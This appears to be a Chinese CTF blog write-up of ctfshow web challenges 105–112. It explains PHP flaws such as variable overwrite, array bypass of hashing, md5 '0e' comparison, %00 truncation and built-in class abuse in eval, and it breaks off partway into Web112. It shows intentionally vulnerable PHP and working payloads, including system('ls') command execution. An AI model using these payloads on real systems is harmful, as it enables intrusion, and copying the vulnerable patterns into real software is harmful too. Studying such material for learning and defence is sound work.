<h2 id="Web105（变量覆盖）"><a href="#Web105（变量覆盖）" class="headerlink" title="Web105（变量覆盖）"></a>Web105（变量覆盖）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$error=&#x27;你还想要flag嘛？&#x27;;</span><br><span class="line">$suces=&#x27;既然你想要那给你吧！&#x27;;</span><br><span class="line">foreach($<span class="attribute">_GET</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;</span><br><span class="line">        die(&quot;<span class="attribute">what</span> are you doing?!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $<span class="variable">$key</span>=$<span class="variable">$value</span>;</span></span><br><span class="line"><span class="string">&#125;foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span></span><br><span class="line"><span class="string">    if(<span class="variable">$value</span>===&#x27;flag&#x27;)&#123;</span></span><br><span class="line"><span class="string">        die(&quot;</span>what are you doing?!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $<span class="variable">$key</span>=$<span class="variable">$value</span>;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!(<span class="variable">$_POST</span>[&#x27;flag&#x27;]==<span class="variable">$flag</span>))&#123;</span></span><br><span class="line"><span class="string">    die(<span class="variable">$error</span>);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo &quot;</span>your are good<span class="string">&quot;.<span class="variable">$flag</span>.&quot;</span>\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">die(<span class="variable">$suces</span>);</span></span><br></pre></td></tr></table></figure>
<p>考点：变量覆盖<br>好悬没给我转不过来，第一眼就进坑了，看到代码的第一眼是不是重点都在</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">die($suces);</span><br></pre></td></tr></table></figure>
<p>这一段代码，想着怎么样才能让他输出flag<br><strong>误区：输入get:a&#x3D;flag      post:flag&#x3D;a</strong><br>这一段是真的很操蛋，我怎么会犯这种低级错误，第一个get传的是没什么问题的，但是post进入foreach后，提取出的是$key&#x3D;flag,这和你$_POST[‘flag’]有什么关系？？？？？</p>
<p><strong>再次陷入误区：</strong><br>我就输入post: _POST[‘flag’]&#x3D;a<br>我就在想我当时为什么隔着套娃呢？你POST数组本来就叫做_POST<br>你再加一个_POST就会被当成这样：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST=array([_POST[&#x27;flag&#x27;]]=&gt;&#x27;a&#x27;])</span><br></pre></td></tr></table></figure>
<p>搁这儿套娃，此_POST被识别成了POST数组中的内容！！！！！</p>
<p><strong>爬出泥潭：</strong><br>于是华生我发现了盲点：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br></pre></td></tr></table></figure>
<p>我是不是只要让$error&#x3D;$flag就行了？？？？？<br>那不是简单吗！payload:<code> (get)?a=flag    (post)error=a</code><br>流程是：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$<span class="attribute">flag</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$a</span>=<span class="variable">$flag</span></span><br></pre></td></tr></table></figure>
<p>然后判断的时候进入if，就die输出了flag！！！！</p>
<h2 id="Web106（数组绕过sha1）"><a href="#Web106（数组绕过sha1）" class="headerlink" title="Web106（数组绕过sha1）"></a>Web106（数组绕过sha1）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $<span class="attribute">v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $<span class="attribute">v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="attribute">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>easy，这里只需要科普一个小知识：<br>PHP中数组绕过可适用于：</p>
<blockquote>
<p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D; null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D; null<br>strpos(Array(),”abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
</blockquote>
<p>可以看到sha1加密也可以用数组绕过<br>传参：?v2[]&#x3D;1   v1[]&#x3D;2</p>
<h2 id="Web107（md5的0e利用）"><a href="#Web107（md5的0e利用）" class="headerlink" title="Web107（md5的0e利用）"></a>Web107（md5的0e利用）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $<span class="attribute">v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $<span class="attribute">v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class="line">           <span class="attribute">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题也不是很难，钱钱的分析一下：</p>
<ul>
<li><strong>parse_str</strong>(string $string, array &amp;$result): void：<code>将字符串解析成多个变量</code></li>
</ul>
<p>string<br>输入的字符串。<br>result<br>如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。<br><strong>警告</strong><br>极度_不建议_在没有 result 参数的情况下使用此函数， 并且在 PHP 7.2 中将_废弃_不设置参数的行为。PHP 8.0.0 起，result 参数是_强制的_。</p>
<pre><code>      这其实和extract函数是一样的，是什么意思呢？：
</code></pre>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="attribute">php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line">// 推荐用法</span><br><span class="line">parse_str($str, $output);</span><br><span class="line"><span class="attribute">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  // 结果：<span class="attribute">value</span></span><br><span class="line">echo <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; // 结果：<span class="attribute">foo</span> bar</span><br><span class="line">echo <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; // 结果：<span class="attribute">baz</span></span><br><span class="line"></span><br><span class="line">// 不建议这么用</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="attribute">echo</span> <span class="variable">$first</span>;  //结果： <span class="attribute">value</span></span><br><span class="line">echo <span class="variable">$arr</span>[<span class="number">0</span>]; //结果：<span class="attribute">foo</span> bar</span><br><span class="line">echo <span class="variable">$arr</span>[<span class="number">1</span>]; // 结果：<span class="attribute">baz</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>就是将我们字符串中的参数给他注册变量，只不过这里我们连接起来用&amp;符号</p>
<p>知道这个函数是什么就好办了，这道题的关键部分就是要让**$v2[‘flag’]&#x3D;md5($v3)**<br>v2是v1中参数注册变量后的结果，所以我们v1内注册v2<br>由于是弱类型比较，我们只需要让md5加密后为0e开头的数字就行（被当成科学计数法），结果会被当成0<br>md5加密后为0e开头的参考这篇文章：</p>
<p>然后输入v2&#x3D;0<br>就可以得到flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662624064238-58382b73-7d2f-4505-b3ae-1a46ab8b8db1.png#averageHue=%23424141&clientId=u6fe82327-ba50-4&from=paste&height=395&id=u4439e23f&name=image.png&originHeight=494&originWidth=898&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50150&status=done&style=none&taskId=ubeb5d7cb-af01-4b35-9241-a698e1f618c&title=&width=718.4" alt="image.png"></p>
<h2 id="Web108（-00截断）"><a href="#Web108（-00截断）" class="headerlink" title="Web108（%00截断）"></a>Web108（%00截断）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ereg:和preg_match一样的作用，他可以添加第三个参数$arr数组，来存放匹配的结果</li>
</ul>
<p>这个函数在PHP5.3后被禁用，因为这个ereg函数有NULL（%00）截断漏洞，可以绕过</p>
<ul>
<li>strrev：字符串反转函数</li>
</ul>
<p>首先正则表达式的意思是<strong>输入的只能是字母</strong>，这个饶了我好半天才想出来，并不是字母开头和结尾就行了，因为有个+号</p>
<p>这里就是考null截断问题，0x36d是877，反过来是778<br>payload：?c&#x3D;a%00778</p>
<h2 id="Web109（内置类的利用）"><a href="#Web109（内置类的利用）" class="headerlink" title="Web109（内置类的利用）"></a>Web109（内置类的利用）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先在开始前，让我们先将一些知识点</p>
<ul>
<li><strong>One</strong></li>
</ul>
<p>就是我们在一个字符串后面加括号，会默认被当成函数执行的，如：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662700425061-b69117e5-85a0-4184-a391-67d4ca7c1331.png#averageHue=%23fefdfd&clientId=u927117bd-3ec8-4&from=paste&height=537&id=u3fcfe256&name=image.png&originHeight=671&originWidth=1815&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118763&status=done&style=none&taskId=ufc6d6456-9599-4af3-8016-492d5617234&title=&width=1452" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662700456090-666b80e9-d385-4678-a530-e2e46a11e129.png#averageHue=%23fefefe&clientId=u927117bd-3ec8-4&from=paste&height=246&id=u1a15c797&name=image.png&originHeight=307&originWidth=1428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8152&status=done&style=none&taskId=u05907f5a-d983-43fb-b329-c29218d8509&title=&width=1142.4" alt="image.png"><br>如图所示，这2个函数都被执行了，也就是说当PHP识别到了形如<code>字符串（）</code>不管正确与否，都会把他当做函数先运行，首先我们要知道这个前提概念</p>
<ul>
<li><strong>Two</strong></li>
</ul>
<p>其次就是要介绍3个内置类，<code>Exception，ReflectionCLass，Error</code><br>这三个内置类都有一个共同特点，就是他们都有<code>__tostring</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662700621379-9def25a0-09ba-4bb5-92c0-7a71dab6ecaf.png#averageHue=%23f9f9f8&clientId=u927117bd-3ec8-4&from=paste&height=417&id=uefbf7aea&name=image.png&originHeight=521&originWidth=880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30795&status=done&style=none&taskId=uc8435cf8-66ec-4374-8171-ad934b70112&title=&width=704" alt="image.png"><br>里面的try，throw，catch的意思在：有被很好解释</p>
<p>就以Error为例子，其他两个内置类都有这一模一样的方法，我们只需要向里面传参，他就会返回<strong>结果</strong>给我们，所以这个参数可以是个<strong>函数</strong><br>也就是说假如我们<code>$a=new Error(&#39;system(&#39;ls&#39;)&#39;)</code>然后<code>echo $a</code>返回的会是结果system后的结果</p>
<ul>
<li><strong>Three</strong></li>
</ul>
<p>那我们的第三步就是去解题了，以上3个内置类随选，现在就来解题，题目的要求就是v1，v2都要有字母就可以<br>构造payload：<br>?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‘ls’)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662701048429-70575736-343e-40bd-af3b-b491a6b58932.png#averageHue=%23535252&clientId=u927117bd-3ec8-4&from=paste&height=281&id=u363bb15a&name=image.png&originHeight=351&originWidth=1234&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37490&status=done&style=none&taskId=u7b5ee3ea-1502-4dfc-b934-d54d48e5917&title=&width=987.2" alt="image.png"><br><strong>这里大家可能会好奇了，明明v2后面还有个（），为什么还能再加括号呢？</strong><br>他其实是先运行了system(‘ls’)，然后把结果当做一个新的函数，大概意思就这样<br><code>flag36dg.txt inde.php()</code><br>这个函数无疑是错误的，所以没有返回值，返回给我们的只有system的结果<br>验证我们这个猜想，我们可以把v2变成phpinfo看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662701185054-de564cd9-d089-4120-8911-67f2cd4bd26b.png#averageHue=%23cdac79&clientId=u927117bd-3ec8-4&from=paste&height=412&id=u628de53c&name=image.png&originHeight=515&originWidth=1751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70135&status=done&style=none&taskId=u50bf0d1e-ae6b-4ab4-b466-10b8e071f93&title=&width=1400.8" alt="image.png"><br>这证明我们的猜想是对的就变成了phpinfo()</p>
<ul>
<li><strong>结果</strong></li>
</ul>
<p>最后就读取fl36dg.txt就得出结果了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662701710731-de912b06-0edf-44b7-9303-4740ed5cfd65.png#averageHue=%23e5be7b&clientId=u927117bd-3ec8-4&from=paste&height=242&id=u05eba48b&name=image.png&originHeight=303&originWidth=1790&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47450&status=done&style=none&taskId=uecd04144-30c5-49b9-8e37-2b364dc3866&title=&width=1432" alt="image.png"></p>
<h2 id="Web110（内置类）"><a href="#Web110（内置类）" class="headerlink" title="Web110（内置类）"></a>Web110（内置类）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题同样也用到了一个内置类：<code>FilesystemIterator</code><br>这个类里有一个构造函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662704717951-bb79d34b-85f4-4800-829c-3e995d753d90.png#averageHue=%23f3f3f3&clientId=u927117bd-3ec8-4&from=paste&height=427&id=u67df635f&name=image.png&originHeight=534&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35590&status=done&style=none&taskId=ua07b7028-ffe8-4617-aedd-6124b555929&title=&width=733.6" alt="image.png"></p>
<ul>
<li>dirname：输入一个路径，会去除掉文件名，获取所属目录，__FILE__就是当前目录</li>
</ul>
<p>可以看到只要输入了当前目录，这个构造函数就会返回一个数组，包含当前目录的所有文件</p>
<p>当我们echo这个内置类，返回的只会是第一个文件名：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662705358822-49d1a5f4-24c2-4388-8745-d184c1034adb.png#averageHue=%233f4751&clientId=u927117bd-3ec8-4&from=paste&height=107&id=u1d0c9dfb&name=image.png&originHeight=134&originWidth=523&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8823&status=done&style=none&taskId=u2947b91b-e2f1-46bd-9aa5-e0f863033f2&title=&width=418.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662705378451-cfc34d4c-e0af-4cb4-a54c-3ea152ee9f67.png#averageHue=%23f2e5bb&clientId=u927117bd-3ec8-4&from=paste&height=114&id=u9daf26d5&name=image.png&originHeight=143&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5823&status=done&style=none&taskId=u2de2d825-8b91-4f67-ad7b-4205a0ac385&title=&width=440" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662705385825-c18636e5-b3a7-458a-b59f-f0f16910ec81.png#averageHue=%23d9dde0&clientId=u927117bd-3ec8-4&from=paste&height=230&id=u926a31e8&name=image.png&originHeight=287&originWidth=196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8637&status=done&style=none&taskId=ub87e5ba1-c630-4202-8304-9e49e0cec4a&title=&width=156.8" alt="image.png"><br>可以看到1.php是排序中第一个文件，得到验证<br>抱着这种想法去构造一下payload，由于v2被ban了下划线和‘.’，所以如何获取当前目录是一个问题</p>
<ul>
<li>getcwd():获取当前所在路径</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662705475805-37cb8a9d-fdd0-4fdb-a6c5-ba15de722e94.png#averageHue=%23fefefe&clientId=u927117bd-3ec8-4&from=paste&height=129&id=u97f7109d&name=image.png&originHeight=161&originWidth=1165&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6615&status=done&style=none&taskId=u0ffeedb5-60b1-4576-9e0e-c7ec91dd5ef&title=&width=932" alt="image.png"><br>所以最后的结果：<br>?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662705514718-941aa9db-cbcd-4fef-8e2c-09ce88fd8705.png#averageHue=%23e8c994&clientId=u927117bd-3ec8-4&from=paste&height=197&id=ufafa0b75&name=image.png&originHeight=246&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30581&status=done&style=none&taskId=uf2b54958-4d42-46e1-9eaf-45149a63f0c&title=&width=962.4" alt="image.png"><br>最后直接url&#x2F;fl36dga.txt即可</p>
<h2 id="Web111（GLOBALS超全局变量）"><a href="#Web111（GLOBALS超全局变量）" class="headerlink" title="Web111（GLOBALS超全局变量）"></a>Web111（GLOBALS超全局变量）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"><span class="attribute">function</span> getFlag(&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span>)&#123;</span><br><span class="line">    eval(&quot;$$<span class="attribute">v1</span> = &amp;$<span class="variable">$v2</span>;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $<span class="attribute">v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $<span class="attribute">v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\<span class="comment">#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span></span><br><span class="line">            die(&quot;<span class="attribute">error</span> v1<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, <span class="variable">$v2</span>))&#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span><span class="literal">error</span> v2<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    if(preg_match(&#x27;/ctfshow/&#x27;, <span class="variable">$v1</span>))&#123;</span></span><br><span class="line"><span class="string">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到特殊符号也ban完了，这题考查的是变量覆盖，GLOBALS超全局变量</p>
<ul>
<li>$GLOBALS:超全局变量,一个包含了全部变量的全局组合数组。变量的名字就是数组的键</li>
</ul>
<p>这一题可以看出就是变量覆盖，其中&amp;表示地址，也就是指针<br>payload：?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</p>
<h2 id="Web112（伪协议利用-回溯次数超过）"><a href="#Web112（伪协议利用-回溯次数超过）" class="headerlink" title="Web112（伪协议利用+回溯次数超过）"></a>Web112（伪协议利用+回溯次数超过）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="attribute">function</span> filter(<span class="variable">$file</span>)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    <span class="attribute">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span 